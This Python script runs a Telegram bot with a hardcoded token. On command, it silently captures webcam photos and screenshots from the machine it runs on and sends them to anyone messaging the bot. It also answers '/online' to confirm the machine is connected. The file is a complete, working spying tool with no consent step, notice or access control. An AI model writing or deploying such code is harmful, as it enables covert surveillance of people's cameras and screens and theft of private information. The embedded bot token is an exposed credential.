import pyautogui
import cv2
import telebot
import os
import os.path

bot = telebot.TeleBot("1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g")
@bot.message_handler(content_types=['text'])
def message_photo(message):
	if message.text == "/photo":
		try:
			videoCaptureObject = cv2.VideoCapture(0)
			result = True
			while(result):
				ret,frame = videoCaptureObject.read()
				cv2.imwrite("NewPicture.jpg",frame)
				result = False
			videoCaptureObject.release()
			cv2.destroyAllWindows()
			photo = open("NewPicture.jpg", "rb")
			bot.send_photo(message.chat.id, photo)
			scr = os.path.isfile("NewPicture.jng")
			if scr == True:
				os.remove("NewPicture.jng")
		except:
			bot.send_message(message.chat.id, "WebCam not found")
	elif message.text == "/screen":
		scr = os.path.isfile("screenshot.png")
		if scr == True:
			os.remove("screenshot.png")
			pyautogui.screenshot("screenshot.png")
			screen = open("screenshot.png", "rb")
			bot.send_photo(message.chat.id, screen)
			os.remove("screenshot.png")
		elif scr == False:	
			pyautogui.screenshot("screenshot.png")
			screen = open("screenshot.png", "rb")
			bot.send_photo(message.chat.id, screen)
			os.remove("screenshot.png")
	elif message.text == "/online":
		bot.send_message(message.chat.id, "Connected")
bot.polling(none_stop=True)
